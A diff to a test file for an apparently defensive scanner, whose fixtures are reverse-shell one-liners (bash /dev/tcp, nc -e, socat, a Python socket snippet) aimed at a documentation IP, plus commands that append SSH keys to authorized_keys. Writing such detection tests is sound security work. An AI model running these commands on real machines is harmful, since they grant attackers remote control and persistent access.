@@ -57,8 +57,10 @@ def _scan(tmp_path: Path, name: str, text: str):
     ("a.ps1", '$key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPLACEHOLDERPLACEHOLDER op@relay"\n'
               'Add-Content -Path "$env:USERPROFILE\\.ssh\\authorized_keys" -Value $key\n'),
     ("a.sh", f'mkdir -p ~/.ssh && echo "{_KEY}" >> ~/.ssh/authorized_keys\n'),
-    ("a.sh", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n"),
-    ("a.sh", "nc 203.0.113.9 4444 -e /bin/sh\n"),
+    # The listener comes from a variable; with a host written out these are
+    # ST-POSTEX-REVERSE-SHELL (tests/test_postex_reverse_shell.py).
+    ("a.sh", 'bash -i >& "/dev/tcp/$LHOST/4444" 0>&1\n'),
+    ("a.sh", 'nc "$LHOST" 4444 -e /bin/sh\n'),
     ("a.sh", "socat tcp:203.0.113.9:4444 exec:'bash -li',pty\n"),
     ("a.py", "import socket, os\ns = socket.socket()\ns.connect(('203.0.113.9', 4444))\n"
              "os.dup2(s.fileno(), 0)\n"),
